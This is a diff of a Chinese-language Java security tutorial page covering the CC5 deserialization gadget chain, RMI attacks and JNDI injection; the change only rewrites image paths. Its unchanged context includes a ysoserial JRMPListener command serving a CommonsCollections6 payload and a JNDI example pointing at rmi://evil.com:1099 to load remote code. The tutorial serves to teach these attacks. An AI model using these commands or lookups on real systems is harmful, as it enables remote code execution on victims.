@@ -587,7 +587,7 @@ TemplatesImpl-&gt;newTransformer()  看谁调用了newTransformer() 找到TrAXFi
 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/java%E5%AE%89%E5%85%A8%5Cimage-20220928094131933.png" alt="image-20220930162749028"></p>
+<p><img src="/image-20220928094131933.png" alt="image-20220930162749028"></p>
 <h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><pre class="line-numbers language-none"><code class="language-none">BadAttributeValueExpException.readObject()
    TiedMapEntry.toString()
       LazyMap.get<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -651,9 +651,9 @@ if __name__=="__main__":
 
 <h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><h3 id="Server-攻击-Registry"><a href="#Server-攻击-Registry" class="headerlink" title="Server 攻击 Registry"></a>Server 攻击 Registry</h3><p>Server 端在执行 bind 或者 rebind 方法的时候会将对象以序列化的形式传输给 Registry，导致 Registry 反序列化被 RCE。</p>
 <h3 id="Client-攻击-Registry"><a href="#Client-攻击-Registry" class="headerlink" title="Client 攻击 Registry"></a>Client 攻击 Registry</h3><p>Registry 端在接收请求的时候会将数据进行反序列化处理：</p>
-<p><img src="/java%E5%AE%89%E5%85%A8%5Ct016ec3aa07726280a5.png" alt="img"></p>
+<p><img src="/t016ec3aa07726280a5.png" alt="img"></p>
 <p>备注（方法和 case 的对应关系）：</p>
-<p><img src="/java%E5%AE%89%E5%85%A8%5Ct0151d5bacfc5d8cc90.png" alt="img"></p>
+<p><img src="/t0151d5bacfc5d8cc90.png" alt="img"></p>
 <p>所以如果控制 lookup 方法的参数是一个恶意对象的话，那么就可以攻击 Registry 达到 RCE 的效果。</p>
 <p>主要问题在于 lookup 方法接收一个 String 类型的参数，无法直接利用，需要手动模拟 RegistryImpl_Stub#lookup 方法传递过程：</p>
 <h4 id="Client-攻击-Server"><a href="#Client-攻击-Server" class="headerlink" title="Client 攻击 Server"></a>Client 攻击 Server</h4><h4 id="Client-发送请求"><a href="#Client-发送请求" class="headerlink" title="Client 发送请求"></a>Client 发送请求</h4><p>Client 端执行完 lookup 方法获取到远程对象，这个对象实际上是一个获取到的远程对象实际上是一个代理对象，请求会被派发到 RemoteObjectInvocationHandler#invoke 方法里面去：</p>
@@ -672,22 +672,22 @@ if __name__=="__main__":
 <p>此外，具体执行哪一个方法是根据 hash 值来识别的：</p>
 <p><img src="https://p0.ssl.qhimg.com/t01842be89d4a79ea84.png" alt="img"></p>
 <h3 id="Server-攻击-Client"><a href="#Server-攻击-Client" class="headerlink" title="Server 攻击 Client"></a>Server 攻击 Client</h3><p>Server 端方法的执行结果也是以序列化的形式传输到 Client 的，还是在 UnicastServerRef#dispatch 方法中：</p>
-<p><img src="/java%E5%AE%89%E5%85%A8%5Ct013c705bbccf0bede7.png" alt="img"></p>
+<p><img src="/t013c705bbccf0bede7.png" alt="img"></p>
 <p>而在 Client 端同样会对方法的执行结果进行反序列化处理，UnicastRef#invoke</p>
-<p><img src="/java%E5%AE%89%E5%85%A8%5Ct0112855844ba961804.png" alt="img"></p>
+<p><img src="/t0112855844ba961804.png" alt="img"></p>
 <p>所以服务端如果可以控制返回的数据为恶意序列化数据，那么客户端就会被 RCE</p>
 <h3 id="Registry-攻击-Client-amp-Server"><a href="#Registry-攻击-Client-amp-Server" class="headerlink" title="Registry 攻击 Client&amp;Server"></a>Registry 攻击 Client&amp;Server</h3><p>更准确的表达是：JRMP 服务端攻击 JRMP 客户端。</p>
 <p>使用 ysoserial 开启一个 JRMP 监听服务（这里指的是 exploit/JRMPListener）：</p>
 <p>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 ‘calc’</p>
 <p>只要服务端或者客户端获取到 Registry，并且执行了以下方法之一，自身就会被 RCE：</p>
 <p>list / unbind / lookup / rebind / bind</p>
-<p><img src="/java%E5%AE%89%E5%85%A8%5Ct01a939c7ef3231d00c.png" alt="img"></p>
-<p><img src="/java%E5%AE%89%E5%85%A8%5Ct01fa098d1f15276109.png" alt="img"></p>
+<p><img src="/t01a939c7ef3231d00c.png" alt="img"></p>
+<p><img src="/t01fa098d1f15276109.png" alt="img"></p>
 <p>RMI 通信过程中使用的是 JRMP 协议，ysoserial 中的 exploit/JRMPListener 会在指定端口开启一个 JRMP Server，然后会向任何连接其的客户端发送反序列化 payload。</p>
 <h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p><a target="_blank" rel="noopener" href="https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/">JNDI注入</a></p>
 <h3 id="JNDI-是什么？"><a href="#JNDI-是什么？" class="headerlink" title="JNDI 是什么？"></a>JNDI 是什么？</h3><p>NDI - Java Naming and Directory Interface 名为 Java命名和目录接口，具体的概念还是比较复杂难懂，具体结构设计细节可以不用了解，简单来说就是 JNDI 提供了一组通用的接口可供应用很方便地去访问不同的后端服务，例如 LDAP、RMI、CORBA 等。如下图：</p>
-<p><img src="/java%E5%AE%89%E5%85%A8%5C1.png" alt="img"></p>
-<h3 id="利用-JNDI-注入加载远程代码并执行"><a href="#利用-JNDI-注入加载远程代码并执行" class="headerlink" title="利用 JNDI 注入加载远程代码并执行"></a>利用 JNDI 注入加载远程代码并执行</h3><p><img src="/java%E5%AE%89%E5%85%A8%5C2.png" alt="img"></p>
+<p><img src="/1.png" alt="img"></p>
+<h3 id="利用-JNDI-注入加载远程代码并执行"><a href="#利用-JNDI-注入加载远程代码并执行" class="headerlink" title="利用 JNDI 注入加载远程代码并执行"></a>利用 JNDI 注入加载远程代码并执行</h3><p><img src="/2.png" alt="img"></p>
 <ol>
 <li>攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 <code>rmi://evil.com:1099/refObj</code>；</li>
 <li>原先配置好的上下文环境 <code>rmi://localhost:1099</code> 会因为动态环境转换而被指向 <code>rmi://evil.com:1099/</code>；</li>
@@ -734,7 +734,7 @@ if __name__=="__main__":
             &lt;/dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>2.首先用工具起一个服务  rmi 服务 或者ldap服务</p>
-<p><img src="/java%E5%AE%89%E5%85%A8%5Cimage-20221008190915569.png" alt="image-20221008190915569"></p>
+<p><img src="/image-20221008190915569.png" alt="image-20221008190915569"></p>
 <p>3.模拟受害机</p>
 <pre class="line-numbers language-none"><code class="language-none">package org.vulhub;
 
